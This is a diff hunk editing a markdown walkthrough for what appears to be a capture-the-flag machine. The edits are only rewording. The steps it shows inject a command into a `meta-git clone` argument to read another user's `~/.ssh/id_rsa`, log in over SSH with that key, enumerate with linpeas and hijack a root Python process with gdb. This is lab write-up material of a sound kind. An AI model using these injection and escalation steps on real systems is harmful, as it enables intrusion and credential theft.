@@ -26,16 +26,16 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.
 
 [This hackerone report was helpfull for the next step](https://hackerone.com/reports/728040)
 
-##### Using that exploit, run `sudo -u developer meta-git clone 'sss | cat ~/.ssh/id_rsa'`
+##### Using the same exploit, run `sudo -u developer meta-git clone 'sss | cat ~/.ssh/id_rsa'`
 [alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsKtY25lSommhunlw5kUf%2Fimage.png?alt=media&token=a33d4792-104b-44c8-8630-6ca691890b69 "id_rsa")
 
 ##### ssh into the developer account after giving `id_rsa` proper permissions. `chmod 600 id_rsa`
 ![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsUcm3E1PKy2j5hmiQXGB%2Fimage.png?alt=media&token=1edbae46-cb9c-4cc2-ae96-fb8cee137222 "kick some shell")
 
-##### Run linpeas on the target for easy enumeration
+##### Run linpeas on the target
 ![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FUb7VQxgMw9z7rt8zbwr1%2Fimage.png?alt=media&token=3c5cfccc-1b1a-4ba6-b069-4362f6be46e4 "linpeas output")
 
-##### You can also run `ps aux | grep root | grep python3`
+##### Running `ps aux | grep root | grep python3` can get you the processes needed as well.
 
 ##### Use gdb to hijack the process
 
